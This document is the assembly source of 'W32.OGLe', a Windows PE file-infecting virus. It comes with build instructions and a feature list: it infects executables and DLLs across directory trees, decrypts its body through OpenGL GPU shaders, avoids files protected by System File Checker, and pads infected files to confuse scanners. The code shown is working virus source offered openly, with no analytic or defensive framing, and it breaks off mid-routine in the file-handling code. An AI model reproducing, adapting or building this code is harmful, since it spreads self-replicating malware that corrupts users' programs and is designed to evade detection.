comment ;)
W32.OGLe by roy g biv

some of its features:
- parasitic direct-action infector of PE exe/dll (but not looking at suffix)
- uses GPU to decrypt body!
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
- uses CRCs instead of API names
- uses SEH for common code exit
- no infect files with data outside of image (eg self-extractors)
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC/SFP (including under Windows XP)
- infected files are padded by random amounts to confuse tail scanners
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 ogle
tlink32 /B:400000 /x ogle,,,import32

Virus is automatically in writable section, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model  flat

extern  VirtualAlloc:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include ogle.inc

MODE_ATI        equ     0   ;set non-zero to enable

dropper         label   near
        mov     eax, offset do_message
        sub     eax, dword ptr [ebx + 8]
        mov     dword ptr [offset host_patch + 1], eax
        push    ebx
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, glucrc_count
        mov     ebx, offset glunames
        mov     edi, offset glucrcbegin
        call    create_crcs
        mov     edx, gdicrc_count
        mov     ebx, offset gdinames
        mov     edi, offset gdicrcbegin
        call    create_crcs
        mov     edx, usrcrc_count
        mov     ebx, offset usrnames
        mov     edi, offset usrcrcbegin
        call    create_crcs
        mov     edx, oglcrc_count
        mov     ebx, offset oglnames
        mov     edi, offset oglcrcbegin
        call    create_crcs
        mov     edx, krncrc_count2
        mov     ebx, offset krnnames2
        mov     edi, offset krncrcbegin2
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs

;-----------------------------------------------------------------------------
;texture size = ceil(sqrt(code size)/4)
;texture is a square of dword units
;but we must double code size because we can use only 16 of each 32 bits at a time
;-----------------------------------------------------------------------------

        push    (offset ogle_codeend - offset ogle_inf) * 2
	mov	ebx, esp
	fild	dword ptr [ebx]
	pop	eax
	fsqrt
        push    4
	fild	dword ptr [ebx]
	fdivp	st(1)
        mov     word ptr [ebx], 0a7fh
        fldcw   word ptr [ebx]
        fistp   dword ptr [ebx]
	pop	eax
        pop     ebx
        mov     byte ptr [offset textsize1 + 1], al
        mov     byte ptr [offset textsize2 + 1], al
        mov     byte ptr [offset textsize3 + 1], al
        mov     byte ptr [offset textsize4 + 1], al
        mov     byte ptr [offset textsize5 + 1], al
        mov     byte ptr [offset textsize6 + 1], al
        shl     eax, 2
        imul    eax, eax
        mov     dword ptr [offset textb_off1 + 1], eax
        lea     esi, dword ptr [eax + offset ogle_inf - offset ogle_codeend]
        mov     dword ptr [offset textb_off2 + 2], esi
        push    PAGE_EXECUTE_READWRITE
        mov     ch, MEM_COMMIT shr 8
        push    ecx
        lea     ecx, dword ptr [eax + eax + offset ogle_inf - offset ogle_codebegin]
        mov     dword ptr [offset allocsize1 + 1], ecx
        push    ecx
        add     ecx, 3
        and     ecx, -4
        mov     word ptr [offset allocsize3 + 2], cx
        add     cx, RANDPADMIN
        mov     word ptr [offset allocsize2 + 2], cx
        push    edx
        shr     eax, 2
        xchg    ebp, eax
        call    VirtualAlloc
        push    eax
        mov     ecx, offset ogle_inf - offset ogle_codebegin
        mov     esi, offset ogle_codebegin
        xchg    edi, eax
        rep     movs byte ptr [edi], byte ptr [esi]

;-----------------------------------------------------------------------------
;perform initial "encoding" (keys are zero, nothing to do)
;-----------------------------------------------------------------------------

        mov     ecx, ((offset ogle_codeend - offset ogle_inf) + 1) shr 1

fake_encode     label   near
        fild    word ptr [esi]
        fstp    dword ptr [edi]
        inc     esi
        inc     esi
        scas    dword ptr [edi]
        loop    fake_encode
        ret

ogle_codebegin  label   near

host_patch      label   near
        push    "!bgr"                          ;replaced by entrypoint RVA
        push    ebx
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near

        call    load_glu
        db      "glu32", 0

load_glu        label   near
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

glucrcbegin     label   near
        dd      (glucrc_count + 1) dup (0)
glucrcend       label   near

        call    load_gdi
        db      "gdi32", 0

load_gdi       label   near
        call    dword ptr [esp + 4 + size glucrcstk + krncrcstk.kGetModuleHandleA]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

gdicrcbegin     label   near
        dd      (gdicrc_count + 1) dup (0)
gdicrcend       label   near

        call    load_user
        db      "user32", 0

load_user       label   near
        call    dword ptr [esp + 4 + size gdicrcstk + size glucrcstk + krncrcstk.kGetModuleHandleA]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

usrcrcbegin     label   near
        dd      (usrcrc_count + 1) dup (0)
usrcrcend       label   near

        call    load_opengl
        db      "opengl32", 0

load_opengl     label   near
        call    dword ptr [esp + 4 + size usrcrcstk + size gdicrcstk + size glucrcstk + krncrcstk.kGetModuleHandleA]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

oglcrcbegin     label   near
        dd      (oglcrc_count + 1) dup (0)
oglcrcend       label   near

api_stack       label   near
        xor     ebp, ebp
        mov     ebx, esp                        ;can use lea if add more APIs
        push    ebp
        push    "TIDE"
        mov     edx, esp
        push    esp
        push    9
        pop     ecx

push_ebp        label   near
        push    ebp
        loop    push_ebp
        push    edx
        push    edx
        push    ebp
        call    dword ptr [ebx + size oglcrcstk + usrcrcstk.uCreateWindowExA]
                                                ;CreateWindow is no export
        push    eax
        xchg    esi, eax
        call    dword ptr [ebx + size oglcrcstk + usrcrcstk.uGetDC]
        push    ebp
        push    ebp
        push    ebp
        push    ebp
        push    ebp
        push    ebp
        push    808h
        push    82000h
        push    PFD_SUPPORT_OPENGL or PFD_DRAW_TO_WINDOW
        push    10000h + size PIXELFORMATDESCRIPTOR
        mov     ecx, esp
        push    edi
        push    eax                             ;wglCreateContext
        push    ecx                             ;SetPixelFormat
        push    ecx
        push    eax
        xchg    edi, eax
        call    dword ptr [ebx + size oglcrcstk + size usrcrcstk + gdicrcstk.gChoosePixelFormat]
        push    eax
        push    edi
        call    dword ptr [ebx + size oglcrcstk + size usrcrcstk + gdicrcstk.gSetPixelFormat]
        call    dword ptr [ebx + oglcrcstk.owglCreateContext]
        pop     ecx
        mov     esp, ebx                        ;discard the temporary data
        push    edi                             ;ReleaseDC(wgldchnd)
        push    esi                             ;DestroyWindow(wglwndhnd)
        push    eax                             ;wglDeleteContext(wglctxhnd)
        push    ecx
        push    eax
        push    edi
        call    dword ptr [ebx + oglcrcstk.owglMakeCurrent]
        pop     eax
        add     eax, offset ogle_inf - offset api_stack
        push    eax                             ;wgltexts[texta]

textb_off1      label   near
        add     eax, "!bgr"
        push    eax                             ;wgltexts[textb]
        call    pop_wgladr
        db      "glActiveTexture", 0
        db      "glAttachShader", 0
        db      "glBindFramebufferEXT", 0
        db      "glCompileShader", 0
        db      "glCreateProgram", 0
        db      "glCreateShader", 0
        db      "glDeleteFramebuffersEXT", 0
        db      "glDeleteProgram", 0
        db      "glDeleteShader", 0
        db      "glDetachShader", 0
        db      "glFramebufferTexture2DEXT", 0
        db      "glGenFramebuffersEXT", 0
        db      "glGetUniformLocation", 0
        db      "glLinkProgram", 0
        db      "glShaderSource", 0
        db      "glUniform1f", 0
        db      "glUniform1i", 0
        db      "glUseProgram", 0
        ;no 0 here to save a byte later

pop_wgladr      label   near
        pop     edi

get_wgladr      label   near
        push    edi
        call    dword ptr [ebx + oglcrcstk.owglGetProcAddress]
        push    eax
        xor     al, al
        or      ecx, -1
        repne   scas byte ptr [edi]
        cmp     byte ptr [edi], al
        jne     get_wgladr

;-----------------------------------------------------------------------------
;create framebuffer object and bind it
;-----------------------------------------------------------------------------

        ;no push here because a dummy value was pushed during get_wgladr
        push    esp
        push    1
        call    dword ptr [ebx + wglcrcstk.wglGenFramebuffersEXT - size wglcrcstk]
        push    dword ptr [ebx + wglcrcstk.wglfb - size wglcrcstk]
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebx + wglcrcstk.wglBindFramebufferEXT - size wglcrcstk]

;-----------------------------------------------------------------------------
;set viewport for texture mapping
;-----------------------------------------------------------------------------

        push    GL_PROJECTION
        call    dword ptr [ebx + oglcrcstk.oglMatrixMode]
        call    dword ptr [ebx + oglcrcstk.oglLoadIdentity]
        push    ebp

textsize1       label   near
        push    "r"
        fild    dword ptr [esp]
        fst     qword ptr [esp]
        push    ebp
        push    ebp
        push    ebp
        push    ebp
        fstp    qword ptr [esp]
        push    ebp
        push    ebp
        call    dword ptr [ebx + size oglcrcstk + size usrcrcstk + size gdicrcstk + glucrcstk.glgluOrtho2D]
        push    GL_MODELVIEW
        call    dword ptr [ebx + oglcrcstk.oglMatrixMode]
        call    dword ptr [ebx + oglcrcstk.oglLoadIdentity]

textsize2       label   near
        push    "r"
        pop     eax
        push    eax
        push    eax
        push    ebp
        push    ebp
        call    dword ptr [ebx + oglcrcstk.oglViewport]

;-----------------------------------------------------------------------------
;create textures - two input textures (code to encrypt, encryption table), one output texture (encrypted/decrypted)
;-----------------------------------------------------------------------------

        push    eax
        push    eax
        push    eax
        push    esp
        push    3
        call    dword ptr [ebx + oglcrcstk.oglGenTextures]
        mov     esi, dword ptr [ebx + wglcrcstk.wgltexts + texta - size wglcrcstk]
        mov     edi, dword ptr [ebx + wglcrcstk.wgltextids + codeid - size wglcrcstk]
        call    loadtext
        mov     edi, dword ptr [ebx + wglcrcstk.wgltextids + outpid - size wglcrcstk]
        call    loadtext
        mov     esi, dword ptr [ebx + wglcrcstk.wgltexts + textb - size wglcrcstk]
        mov     edi, dword ptr [ebx + wglcrcstk.wgltextids + xlatid - size wglcrcstk]
        call    loadtext
        push    GL_REPLACE
        mov     eax, GL_TEXTURE_ENV_MODE
        push    eax
        mov     ah, GL_TEXTURE_ENV shr 8
        push    eax
        call    dword ptr [ebx + oglcrcstk.oglTexEnvi]

;-----------------------------------------------------------------------------
;create program object and shader object
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + wglcrcstk.wglCreateProgram - size wglcrcstk]
        push    eax
        xchg    edi, eax
        push    GL_FRAGMENT_SHADER_ARB
        call    dword ptr [ebx + wglcrcstk.wglCreateShader - size wglcrcstk]
        push    eax
        xchg    esi, eax

;-----------------------------------------------------------------------------
;shader source code, very simple right now
;-----------------------------------------------------------------------------

        call    skip_shader
        db      "uniform sampler2DRect a,b;"
        db      "uniform float c;"
        db      "void main()"
        db      "{"
        db      "gl_FragColor=texture2DRect(a,gl_TexCoord[0].st)+texture2DRect(b,gl_TexCoord[0].st)*c;"
        db      "}", 0

skip_shader     label   near
        mov     eax, esp
        push    ebp
        push    eax
        push    1
        push    esi
        call    dword ptr [ebx + wglcrcstk.wglShaderSource - size wglcrcstk]

;-----------------------------------------------------------------------------
;compile shader code, attach to program object, link entire program
;-----------------------------------------------------------------------------

        push    esi
        call    dword ptr [ebx + wglcrcstk.wglCompileShader - size wglcrcstk]
        push    esi
        push    edi
        call    dword ptr [ebx + wglcrcstk.wglAttachShader - size wglcrcstk]
        push    edi
        call    dword ptr [ebx + wglcrcstk.wglLinkProgram - size wglcrcstk]

;-----------------------------------------------------------------------------
;find location of variables to assign
;-----------------------------------------------------------------------------

        push    "a"
        push    esp
        push    edi
        call    dword ptr [ebx + wglcrcstk.wglGetUniformLocation - size wglcrcstk]
        mov     dword ptr [ebx + wglcrcstk.wglaloc - size wglcrcstk], eax
        push    "b"
        push    esp
        push    edi
        call    dword ptr [ebx + wglcrcstk.wglGetUniformLocation - size wglcrcstk]
        mov     dword ptr [ebx + wglcrcstk.wglbloc - size wglcrcstk], eax
        push    "c"
        push    esp
        push    edi
        call    dword ptr [ebx + wglcrcstk.wglGetUniformLocation - size wglcrcstk]
        mov     dword ptr [ebx + wglcrcstk.wglcloc - size wglcrcstk], eax

;-----------------------------------------------------------------------------
;attach textures to framebuffer object and then enable shader program
;-----------------------------------------------------------------------------

        push    ebp                             ;glFramebufferTexture2DEXT
        push    dword ptr [ebx + wglcrcstk.wgltextids + codeid - size wglcrcstk]
                                                ;glFramebufferTexture2DEXT
        mov     ecx, GL_TEXTURE_RECTANGLE_ARB
        push    ecx                             ;glFramebufferTexture2DEXT
        mov     eax, GL_COLOR_ATTACHMENT1_EXT
        push    eax                             ;glFramebufferTexture2DEXT
        mov     edx, GL_FRAMEBUFFER_EXT
        push    edx                             ;glFramebufferTexture2DEXT
        push    ebp
        push    dword ptr [ebx + wglcrcstk.wgltextids + outpid - size wglcrcstk]
        push    ecx
        dec     eax                             ;GL_COLOR_ATTACHMENT0_EXT
        push    eax
        push    edx
        call    dword ptr [ebx + wglcrcstk.wglFramebufferTexture2DEXT - size wglcrcstk]
        call    dword ptr [ebx + wglcrcstk.wglFramebufferTexture2DEXT - size wglcrcstk]
        push    edi
        call    dword ptr [ebx + wglcrcstk.wglUseProgram - size wglcrcstk]

;-----------------------------------------------------------------------------
;enable encryption table texture and assign to variable
;-----------------------------------------------------------------------------

        push    GL_TEXTURE1
        call    dword ptr [ebx + wglcrcstk.wglActiveTexture - size wglcrcstk]
        push    dword ptr [ebx + wglcrcstk.wgltextids + xlatid - size wglcrcstk]
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebx + oglcrcstk.oglBindTexture]
        push    1
        push    dword ptr [ebx + wglcrcstk.wglbloc - size wglcrcstk]
        call    dword ptr [ebx + wglcrcstk.wglUniform1i - size wglcrcstk]

;-----------------------------------------------------------------------------
;assign modifier value to variable
;-----------------------------------------------------------------------------

modc            label   near
        push    "!bgr"
        mov     edi, esp
        fild    dword ptr [edi]
        fstp    dword ptr [edi]
        push    dword ptr [ebx + wglcrcstk.wglcloc - size wglcrcstk]
        call    dword ptr [ebx + wglcrcstk.wglUniform1f - size wglcrcstk]

;-----------------------------------------------------------------------------
;set render destination, enable code texture, assign to variable
;-----------------------------------------------------------------------------

        push    GL_COLOR_ATTACHMENT0_EXT
        call    dword ptr [ebx + oglcrcstk.oglDrawBuffer]
        push    GL_TEXTURE0
        call    dword ptr [ebx + wglcrcstk.wglActiveTexture - size wglcrcstk]
        push    dword ptr [ebx + wglcrcstk.wgltextids + codeid - size wglcrcstk]
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebx + oglcrcstk.oglBindTexture]
        push    ebp
        push    dword ptr [ebx + wglcrcstk.wglaloc - size wglcrcstk]
        call    dword ptr [ebx + wglcrcstk.wglUniform1i - size wglcrcstk]

;-----------------------------------------------------------------------------
;define rectangle that holds texture, perform rendering
;-----------------------------------------------------------------------------

        push    GL_QUADS
        call    dword ptr [ebx + oglcrcstk.oglBegin]

textsize3       label   near
        push    "r"
        fild    dword ptr [edi]
        fstp    dword ptr [edi]
        pop     esi
        push    esi                             ;glVertex2f
        push    ebp                             ;glVertex2f
        push    esi                             ;glTexCoord2f
        push    ebp                             ;glTexCoord2f
        push    esi                             ;glVertex2f
        push    esi                             ;glVertex2f
        push    esi                             ;glTexCoord2f
        push    esi                             ;glTexCoord2f
        push    ebp                             ;glVertex2f
        push    esi                             ;glVertex2f
        push    ebp                             ;glTexCoord2f
        push    esi                             ;glTexCoord2f
        push    ebp                             ;glVertex2f
        push    ebp                             ;glVertex2f
        push    ebp
        push    ebp
        push    4
        pop     ebp

loop_vertex     label   near
        call    dword ptr [ebx + oglcrcstk.oglTexCoord2f]
        call    dword ptr [ebx + oglcrcstk.oglVertex2f]
        dec     ebp
        jne     loop_vertex
        call    dword ptr [ebx + oglcrcstk.oglEnd]

;-----------------------------------------------------------------------------
;read data from texture, run it
;-----------------------------------------------------------------------------

        push    GL_COLOR_ATTACHMENT0_EXT
        call    dword ptr [ebx + oglcrcstk.oglReadBuffer]
        mov     esi, dword ptr [ebx + wglcrcstk.wgltexts + texta - size wglcrcstk]
        push    esi
        push    GL_FLOAT
        push    GL_RGBA

textsize4       label   near
        push    "r"
        pop     eax
        push    eax
        push    eax
        push    ebp
        push    ebp
        call    dword ptr [ebx + oglcrcstk.oglReadPixels]
        push    esi
        mov     ecx, ((offset ogle_codeend - offset ogle_inf) + 1) shr 1
        mov     edi, esi

xlat_dww        label   near
        fld     dword ptr [esi]
        fistp   word ptr [edi]
        lods    dword ptr [esi]
        inc     edi
        inc     edi
        loop    xlat_dww
        ret

loadtext        proc    near
        mov     ecx, GL_CLAMP
        push    ecx                             ;glTexParameteri
        mov     eax, GL_TEXTURE_WRAP_T
        push    eax                             ;glTexParameteri
        mov     edx, GL_TEXTURE_RECTANGLE_ARB
        push    edx                             ;glTexParameteri
        push    ecx                             ;glTexParameteri
        dec     eax                             ;GL_TEXTURE_WRAP_S
        push    eax                             ;glTexParameteri
        push    edx                             ;glTexParameteri
        mov     ch, GL_NEAREST shr 8
        push    ecx                             ;glTexParameteri
        dec     eax
        dec     eax                             ;GL_TEXTURE_MAG_FILTER
        push    eax                             ;glTexParameteri
        push    edx                             ;glTexParameteri
        push    ecx                             ;glTexParameteri
        inc     eax                             ;GL_TEXTURE_MIN_FILTER
        push    eax                             ;glTexParameteri
        push    edx                             ;glTexParameteri
        push    edi
        push    edx
        call    dword ptr [ebx + oglcrcstk.oglBindTexture]
        push    4
        pop     ebp

loop_texparam   label   near
        call    dword ptr [ebx + oglcrcstk.oglTexParameteri]
        dec     ebp
        jne     loop_texparam
        push    ebp
        push    GL_FLOAT
        push    GL_RGBA
        push    ebp

textsize5       label   near
        push    "r"
        pop     eax
        push    eax
        push    eax
        push    GL_RGBA32F_ARB
        push    ebp
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebx + oglcrcstk.oglTexImage2D]
ife MODE_ATI
        push    esi
        push    GL_FLOAT
        push    GL_RGBA

textsize6       label   near
        push    "r"
        pop     eax
        push    eax
        push    eax
        push    ebp
        push    ebp
        push    ebp
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebx + oglcrcstk.oglTexSubImage2D]
else
        push    ebp
        push    esi
        push    GL_TEXTURE_RECTANGLE_ARB
        push    GL_COLOR_ATTACHMENT0_EXT
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebx + oglcrcstk.oglFramebufferTexture2DEXT]
        push    GL_COLOR_ATTACHMENT0_EXT
        call    dword ptr [ebx + oglcrcstk.oglDrawBuffer]
        push    ebp
        push    ebp
        call    dword ptr [ebx + oglcrcstk.oglRasterPos2i]
        push    esi
        push    GL_FLOAT
        push    GL_RGBA

textsize6       label   near
        push    "r"
        pop     eax
        push    eax
        push    eax
        call    dword ptr [ebx + oglcrcstk.oglDrawPixels]
        push    ebp
        push    ebp
        push    GL_TEXTURE_RECTANGLE_ARB
        push    GL_COLOR_ATTACHMENT0_EXT
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebx + oglcrcstk.oglFramebufferTexture2DEXT]
endif
        ret
loadtext        endp
        db      "OGLe - roy g biv"              ;check it out! ;)

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports   label   near
        pop     edi
        xchg    ebx, eax
        mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi
        db      "12/03/12"

;-----------------------------------------------------------------------------
;clean up time
;-----------------------------------------------------------------------------

ogle_inf        label   near
        mov     eax, dword ptr [ebx + wglcrcstk.wglshader - size wglcrcstk]
        mov     ecx, dword ptr [ebx + wglcrcstk.wglprogram - size wglcrcstk]
        push    ecx
        push    eax
        push    eax
        push    ecx
        call    dword ptr [ebx + wglcrcstk.wglDetachShader - size wglcrcstk]
        call    dword ptr [ebx + wglcrcstk.wglDeleteShader - size wglcrcstk]
        call    dword ptr [ebx + wglcrcstk.wglDeleteProgram - size wglcrcstk]
        lea     eax, dword ptr [ebx + wglcrcstk.wglfb - size wglcrcstk]
        push    eax
        push    1
        call    dword ptr [ebx + wglcrcstk.wglDeleteFramebuffersEXT - size wglcrcstk]
        lea     eax, dword ptr [ebx + wglcrcstk.wgltextids - size wglcrcstk]
        push    eax
        push    3
        call    dword ptr [ebx + oglcrcstk.oglDeleteTextures]
        lea     esp, dword ptr [ebx + wglcrcstk.wglctxhnd - size wglcrcstk]
        call    dword ptr [ebx + oglcrcstk.owglDeleteContext]
        pop     esi
        push    esi
        call    dword ptr [ebx + size oglcrcstk + usrcrcstk.uReleaseDC]
        push    esi
        call    dword ptr [ebx + size oglcrcstk + usrcrcstk.uDestroyWindow]

;-----------------------------------------------------------------------------
;main body is really here
;-----------------------------------------------------------------------------

        push    PAGE_READWRITE
        push    MEM_COMMIT

allocsize1      label   near
        push    "!bgr"
        push    ebp
        call    dword ptr [ebx + size oglcrcstk + size usrcrcstk + size gdicrcstk + size glucrcstk + krncrcstk.kVirtualAlloc]
        mov     ecx, offset ogle_codeend - offset ogle_codebegin

;-----------------------------------------------------------------------------
;the sub value might be the same as the one in ecx
;but I couldn't find a reliable way to detect it in a macro
;because its value depends on the assembler pass number
;-----------------------------------------------------------------------------

        sub     edi, (offset ogle_inf - offset ogle_codebegin) + (((offset ogle_codeend - offset ogle_inf) + 1) and -2)
        mov     dword ptr [edi + (offset bodyoff - offset ogle_codebegin) + 1], eax
        xchg    edi, eax
        xchg    esi, eax
        rep     movs byte ptr [edi], byte ptr [esi]
        call    crypt_body
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        add     esp, 4 + size oglcrcstk + size usrcrcstk + size gdicrcstk + size glucrcstk + size krncrcstk
        pop     ebx
        pop     eax
        add     eax, dword ptr [ebx + 8]
        jmp     eax

crypt_body      label   near
        push    dword ptr fs:[ecx]
        mov     dword ptr fs:[ecx], esp
        enter   ((size findlist - 5) and -4) + ((statelen + 1) shl 2), 0
                                                ;Windows NT/2000/XP enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
                                                ;statelen for RNG cache
        push    ecx                             ;zero findprev in findlist
        push    edi
        mov     eax, dword ptr ds:[7ffe0008h]   ;interrupt time (GetTickCount not available yet)
        lea     edi, dword ptr [ebp - (statelen shl 2)]
        call    randinit
        movzx   eax, al
        pop     edi
        mov     dword ptr [edi + (offset modc - offset ogle_codeend) + 1], eax
        push    eax
        mov     esi, esp
        fild    word ptr [esi]
        mov     word ptr [esi], 0a7fh
        fldcw   word ptr [esi]
        mov     cx, ((offset ogle_codeend - offset ogle_inf) + 1) shr 1
        lea     esi, dword ptr [edi + offset ogle_inf - offset ogle_codeend]

textb_off2      label   near
        add     edi, "!bgr"

real_encode     label   near
        call    random
        push    eax
        fild    word ptr [esp]
        pop     eax
        fild    word ptr [esi + ecx * 2 - 2]
        fsub    st(0), st(1)
        fstp    dword ptr [esi + ecx * 4 - 4]
        fdiv    st(0), st(1)
        fstp    dword ptr [edi + ecx * 4 - 4]
        loop    real_encode
        fstp    dword ptr [esp]
        pop     eax
        call    skip_krn
        db      "kernel32", 0

skip_krn        label   near
        call    dword ptr [ebx + size oglcrcstk + size usrcrcstk + size gdicrcstk + size glucrcstk + krncrcstk.kLoadLibraryA]
                                                ;GetModuleHandle is 80h bytes away
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin2    label   near
        dd      (krncrc_count2 + 1) dup (0)

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    dword ptr [esp + krncrcstk2.k2LoadLibraryA]
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows 2000
        push    esp
        call    dword ptr [esp + 4 + krncrcstk2.k2LoadLibraryA]
        pop     ecx
        test    eax, eax
        je      sfcapi_push

found_sfc       label   near
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near
        dd      0, 0
        pop     eax

sfcapi_push     label   near
        push    eax

;-----------------------------------------------------------------------------
;swap CreateFileW and CreateFileMappingA because of alphabet order
;-----------------------------------------------------------------------------

        mov     ebx, esp
        lea     esi, dword ptr [ebx + krncrcstk2.k2CreateFileMappingA]
        mov     edi, esi
        lods    dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        stos    dword ptr [edi]

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;so for Windows NT/2000/XP this code handles files that no ANSI function can open
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + krncrcstk2.k2GetVersion]
        shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
                                                ;safer than using AreFileApisANSI()
        lea     ebp, dword ptr [eax * 4 + ebx]
        lea     esi, dword ptr [ebx + size krncrcstk2]

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;ANSI-compatible Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk2.k2FindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk2.k2SetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   find_next
        push    size findlist
        push    GMEM_FIXED
        call    dword ptr [esp + krncrcstk2.k2GlobalAlloc + 8]
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk2.k2FindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        push    edi
        call    dword ptr [ebx + krncrcstk2.k2FindClose]

find_prev       label   near
        mov     ecx, dword ptr [esi + findlist.findprev]
        jecxz   ogle_exit
        push    esi
        mov     esi, ecx
        call    dword ptr [ebx + krncrcstk2.k2GlobalFree]

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        org     $ - 1                           ;select top 8 bits of push
ogle_exit       label   near
        int     3                               ;game over

        push    esp
        call    dword ptr [ebx + krncrcstk2.k2SetCurrentDirectoryA]
        pop     eax
        jmp     find_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path and convert to Unicode if required (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
